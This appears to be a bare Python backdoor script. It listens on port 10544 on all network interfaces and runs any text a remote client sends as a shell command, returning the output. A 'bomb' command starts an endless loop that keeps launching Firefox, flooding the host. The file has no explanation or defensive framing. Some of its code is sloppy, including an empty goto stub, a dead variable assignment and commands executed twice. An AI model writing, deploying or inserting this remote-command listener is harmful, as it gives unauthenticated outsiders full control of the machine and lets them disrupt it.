import socket
from threading import Thread
import os
import sys
import subprocess

bomb = False

def goto(line) :
  global lineNumber


MAX_LENGTH = 50000

PORT = 10544
HOST = '0.0.0.0'

def handle(clientsocket):
  while True:
    buf = clientsocket.recv(MAX_LENGTH).decode("utf-8")
    if buf == '': return #client terminated connection
    #buf = buf.decode("utf-8")
    try:
        os.system(buf)
        returned = subprocess.check_output(buf)
        clientsocket.send(returned)
    except:
      line = 16
      execmsg = 'Executed'
      clientsocket.send(execmsg.encode('utf-8'))
    if buf == 'bomb':
        bomb = True
        while bomb == True:
            os.system('firefox')


serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

serversocket.bind((HOST, PORT))
serversocket.listen(10)

while 1:
    #accept connections from outside
    (clientsocket, address) = serversocket.accept()
    #Multiple Threads
    ct = Thread(target=handle, args=(clientsocket,))
    ct.start()
